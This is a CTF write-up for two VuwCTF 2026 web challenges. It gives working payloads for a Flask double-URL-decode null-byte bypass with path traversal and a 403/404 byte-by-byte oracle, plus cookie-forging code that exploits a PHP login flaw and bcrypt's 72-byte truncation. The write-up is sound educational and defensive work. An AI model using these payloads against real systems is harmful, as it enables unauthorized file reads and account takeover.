**VuwCTF 2026** ’s web track — two lessons in _boundary mismatches_ , where two components each look correct in isolation but disagree about what the input means. **just-download-it** (100 pts, Easy) is a Flask image host where the validator and the file-opener decode the path a different number of times — a double URL-decode that smuggles a null byte past a `.png` filter, plus a `403`-vs-`404` oracle that leaks the flag byte by byte. **ant-universe** (a 1999-era PHP forum) pairs a login endpoint that never checks the password with bcrypt’s silent 72-byte truncation, hand-tuned so exactly one character of the target user’s password lands inside the hash window. This writeup solves both step by step.

## Challenge 1 — just-download-it (Easy, 100 pts)#

> Just Download it!

A Flask image-sharing app with source provided. The interesting logic is all in `/files`:

```
    @app.route('/files')
    def list_files():
        target_file = request.args.get('file')
        key = request.args.get('key')
        if target_file:
            if not target_file.lower().endswith('.png'):   # Guard 1
                abort(403)
            if '\x00' in target_file:                        # Guard 2
                abort(403)
            target_file = unquote(target_file)               # ⚠ second decode
            target_file = target_file.split(chr(0))[0]
            file_path = os.path.join(SHARED_FOLDER, target_file)
            with open(file_path, 'rb') as f:                 # key check via raw open
                secret_value = f.read(5).hex(' ').upper()
            if key != secret_value:
                abort(403)
            return send_from_directory(SHARED_FOLDER, target_file, as_attachment=True)
```

### Step 1 — The double URL-decode null-byte bypass#

Flask/Werkzeug URL-decodes query parameters **once** automatically. The app then calls `unquote()` **again** — a classic double-decode. That lets a double-encoded null byte slip past both guards:

Step| Value  
---|---  
We send (raw URL)| `file=evil.txt%2500.png`  
Flask auto-decodes (`%25` → `%`)| `evil.txt%00.png`  
Guard 1 `.endswith('.png')`| ✅ still ends `.png`  
Guard 2 `'\x00' in ...`| ✅ `%00` is not a raw null yet  
`unquote()` second decode (`%00` → `\x00`)| `evil.txt\x00.png`  
`.split(chr(0))[0]`| `evil.txt`  
  
After the split, the `.png` requirement is gone and the app opens whatever file you named.

### Step 2 — Path traversal#

`target_file` is never sanitized, so `os.path.join` happily accepts `../`:

```
    file=../flag/Flag1.txt%2500.png
    → os.path.join('/app/shared_files', '../flag/Flag1.txt')
    → open('/app/flag/Flag1.txt')
```

### Step 3 — Grab the target image and OCR the hint#

Listing `/files` shows `illegal.jpg`, which the normal `.png`-only route refuses. Its first five bytes are the JFIF magic `FF D8 FF E0 00`, so the key check wants `secret_value = 'FF D8 FF E0 00'`:

```
    curl -s "https://<inst>/files?file=illegal.jpg%2500.png&key=FF%20D8%20FF%20E0%2000" -o illegal.jpg
    tesseract illegal.jpg stdout
```

The banner image reads: the flag is split across `/app/flag/Flag1.txt … FlagN.txt`, each file holding a single character.

### Step 4 — Build the 403/404 status-code oracle#

The key check uses raw `open()`, but delivery uses `send_from_directory`, whose internal `safe_join` **raises 404 on any`../`**. That mismatch produces a three-way oracle:

Situation| Response  
---|---  
File missing (`open` → `FileNotFoundError`)| `404`  
File exists, **wrong** key| `403`  
File exists, **correct** key (but traversal path)| `404`  
  
So an impossible key (e.g. `00`, which can’t be a printable char’s hex) gives `403` = “file exists”, `404` = “missing” — a file-existence oracle. And once a file exists, the **correct** key flips the response from `403` to `404` — a content oracle.

### Step 5 — Enumerate and brute-force each character#

```
    def file_exists(n):        # impossible key '00' → 403 means the file exists
        return GET(f"/files?file=../flag/Flag{n}.txt%2500.png&key=00") == "403"
    
    # 8 files exist: Flag1..Flag8
    for byte_val in range(0x20, 0x7F):
        key = format(byte_val, '02X')   # one-byte file → 'read(5)' is 2 hex digits, no spaces
        if GET(f"/files?file=../flag/Flag{N}.txt%2500.png&key={key}") == "404":
            return chr(byte_val)        # 404 = key matched + traversal blocked
```

Running all eight in parallel:

```
    Flag1 → '!'   Flag2 → 'L'   Flag3 → '3'   Flag4 → 'A'
    Flag5 → 'K'   Flag6 → '*'   Flag7 → 'D'   Flag8 → '!'
```

### Flag#

```
    VuwCTF{!L3AK*D!}
```

**Root cause:** three cooperating bugs — the double decode bypasses the `.png` and null-byte guards, the unsanitized join enables traversal, and the `open()`-vs-`send_from_directory` mismatch turns HTTP status codes into a byte-at-a-time read primitive.

## Challenge 2 — ant-universe#

> A 1999-era ant-themed forum. Registration is closed. Read user 3’s private blog.

Source is provided. Five users are pre-seeded; user 3 is `myrealnamedefisnot_spuukygrrl10311985` — a conspicuously long 37-character username. The private blog is gated behind a bcrypt check. Two independent bugs combine.

### V1 — Login never verifies the password#

```
    // login.php
    $user = pg_fetch_all(...);         // SELECT * FROM users WHERE username = $1
    if ($user) {
        $token = [$user[0]["date_joined"], $_POST["username"], $_POST["password"]];
        setcookie("token", json_encode($token), ...);   // password never checked
        header("Location: /user.php?u=" . $user[0]["id"]);
    }
```

If the username exists, the server sets a cookie containing `[$date_joined, $username, $submitted_password]` — **whatever password you supplied** , never compared to anything. We fully control the cookie content.

### The gate — user.php passes the raw cookie to bcrypt#

```
    // user.php
    if (password_verify($_COOKIE["token"], $hash)) {   // $hash = stored bcrypt from DB
        echo "<p>" . $blog . "</p>";
    }
```

The stored hash was computed at registration (visible in `register.php`’s dead code, after its `exit()`) as:

```
    password_hash(json_encode([$date, $username, $password]), PASSWORD_BCRYPT)
```

Our cookie has the **same JSON structure**. If the cookie matches the original in its first 72 bytes, `password_verify` returns true — because of V2.

### V2 — BCrypt silently truncates at 72 bytes#

`password_hash(..., PASSWORD_BCRYPT)` caps its input at **72 bytes** and silently discards the rest — no error, no warning. `password_verify` truncates the same way. So only the first 72 bytes of the JSON string matter.

### The intersection — why user 3 is the target#

Count the fixed prefix before the password for user 3 (`date_joined = "1999-04-13 23:47:40.126783"`, 26 bytes; username 37 bytes):

```
    ["1999-04-13 23:47:40.126783","myrealnamedefisnot_spuukygrrl10311985","?
     └──────────────────── 71 bytes ─────────────────────────────────────┘└ byte 72
```

Component| Bytes| Cumulative  
---|---|---  
`["`| 2| 2  
date (26)| 26| 28  
`","`| 3| 31  
username (37)| 37| 68  
`","`| 3| 71  
**password[0]**| **1**| **72 ← bcrypt cutoff**  
  
The prefix is exactly **71 bytes** , so bcrypt hashes the prefix plus **only the first character** of the password; everything after is discarded. The brute-force space collapses from the whole password to a single printable ASCII byte (≤95 candidates).

### Exploitation#

**Confirm the login bypass** (any password works):

```
    curl -sk -c /tmp/c.txt -X POST \
      -d 'username=myrealnamedefisnot_spuukygrrl10311985&password=anything' \
      'https://<inst>/login.php'      # → 302 to /user.php?u=3
```

**Craft the cookie exactly like PHP’s`json_encode`** — compact separators are mandatory:

```
    import json, urllib.parse
    DATE = "1999-04-13 23:47:40.126783"
    USER = "myrealnamedefisnot_spuukygrrl10311985"
    
    def make_cookie(ch):
        # PHP json_encode has NO spaces after ',' or ':'
        php_json = json.dumps([DATE, USER, ch], separators=(',', ':'))
        return "token=" + urllib.parse.quote(php_json, safe='')
```

The `separators=(',', ':')` is not cosmetic: Python’s default `json.dumps` inserts a space after each comma, which would push the prefix to 72 bytes and put **zero** password characters inside the bcrypt window — every guess would fail. Compact encoding keeps the prefix at 71.

**Brute-force`password[0]`** against `/user.php?u=3`, using response length (an extra `<p>` from the private blog) as the oracle. Baseline is 2 `<p>` tags; a match adds a third. The Halloween/1999 theme (`spuukygrrl`) hints at `h`:

```
    'p' (0x70) len=643
    'h' (0x68) len=887   ← MATCH (private blog rendered)
```

**Read the flag:**

```
     this is my private blog!
    i wonder if it's safe to write that i'm a deer, not an ant and not even a moose...!
    well if it's safe to write that it must be safe to write this:
    VuwCTF{i_wrote_this_before_chapter_5_came_out}
```

### Flag#

```
    VuwCTF{i_wrote_this_before_chapter_5_came_out}
```

**Root cause:** neither bug alone leaks the flag. V1 gives you control of the bcrypt pre-image but you still must pass the check; V2 shrinks that check to one byte. The author sized user 3’s `date_joined` and username so the 71-byte prefix leaves exactly one password byte in the window.

* * *

## Cross-cutting notes#

**Boundary mismatches are the whole web track.** Both challenges hinge on two components disagreeing about the input. just-download-it: the validator decodes once, the opener decodes twice — and the key-checker (`open`) and the deliverer (`send_from_directory`) disagree about `../`. ant-universe: the login trusts the password while the gate re-derives it, and bcrypt disagrees with the application about how many bytes count. Whenever two layers process the same value, check whether they normalize it identically.

**Double-decode + null byte is a canonical filter bypass.** A guard that checks a suffix/prefix on an already-decoded value, followed by a second `unquote`, lets `%2500` become a raw `\x00` _after_ the check. Splitting on the null then discards the “safe” suffix. Any time you see two decode passes around a validation, try a double-encoded null byte.

**Status codes are an exfiltration channel.** just-download-it never returns the flag bytes directly — it returns `403` or `404`, and the difference is enough to read the file one byte per request. When an app branches on secret-dependent conditions and surfaces the branch through status, timing, or length, that’s a side-channel oracle regardless of whether a body is ever leaked.

**Never feed long structured strings to bcrypt.** bcrypt’s 72-byte truncation is silent, and it becomes exploitable exactly when an attacker controls the bytes before the secret and the fixed prefix is long enough to push the secret to byte 72\. Pre-hash with SHA-256, use Argon2id (no truncation), or hash the password alone — embedding `date_joined` and `username` in the hash input added no security and created the hole.

**Match the server’s serialization byte-for-byte.** The ant-universe exploit fails silently unless Python’s JSON matches PHP’s compact `json_encode`. A single extra space shifts the 71-byte prefix to 72 and moves the secret out of the hash window. When you replicate a server-side pre-image, replicate its exact encoding.

## Frequently Asked Questions#

**Q: What is the double URL-decode null-byte bypass in just-download-it?**

Flask/Werkzeug URL-decodes query parameters once automatically. The app then calls `urllib.parse.unquote()` a second time. Sending `file=evil.txt%2500.png` decodes to `evil.txt%00.png` after Flask’s pass — which still ends in `.png` and contains no raw null byte, so both guards pass. The app’s second `unquote()` turns `%00` into a real `\x00`, and `split(chr(0))[0]` strips the null and the `.png` suffix, leaving `evil.txt`. This defeats the extension filter and enables path traversal via `os.path.join`.

**Q: How does the 403 vs 404 oracle leak the flag one byte at a time?**

The key check reads the target file with raw `open()`, but delivery uses Werkzeug’s `send_from_directory`, whose `safe_join` returns 404 for any path containing `../`. So: a missing file returns 404 (open fails), an existing file with a wrong key returns 403, and an existing file with the correct key returns 404 (traversal blocked at delivery). Probing with an impossible key distinguishes existence (403 vs 404), and once a file is known to exist, the correct one-byte key flips 403 to 404 — revealing each single-character flag file.

**Q: Why does bcrypt only require guessing one character of ant-universe’s password?**

PHP’s `password_hash(..., PASSWORD_BCRYPT)` silently truncates its input to 72 bytes, and `password_verify` truncates identically. The hashed value is `json_encode([date, username, password])`. For user 3 the JSON prefix before the password — `["1999-04-13 23:47:40.126783","myrealnamedefisnot_spuukygrrl10311985","` — is exactly 71 bytes, so bcrypt hashes the prefix plus only the first password character. Every character after the first is discarded, so the brute force is a single printable-ASCII byte.

**Q: Why is the login bypass alone not enough in ant-universe?**

`login.php` never calls `password_verify`, so any password logs you in and sets a cookie you control — but the private blog in `user.php` only renders if `password_verify($cookie, $stored_hash)` returns true. The login bypass gives you control of the bcrypt pre-image; you still need a cookie whose first 72 bytes match the original hash input. The bcrypt truncation bug is what makes that feasible by reducing the unknown to one byte.

**Q: Why does the JSON separators setting matter in the ant-universe exploit?**

PHP’s `json_encode` produces compact JSON with no spaces after commas or colons, e.g. `["date","user","h"]`. Python’s default `json.dumps` inserts a space after each comma. That extra space lengthens the prefix from 71 to 72 bytes, pushing the first password character to byte 73 — outside bcrypt’s 72-byte window — so no guess can ever match. Using `json.dumps(..., separators=(',', ':'))` reproduces PHP’s encoding and keeps the prefix at 71 bytes.

**Q: What are the flags for the VuwCTF 2026 web challenges?**

just-download-it: `VuwCTF{!L3AK*D!}`. ant-universe: `VuwCTF{i_wrote_this_before_chapter_5_came_out}`.
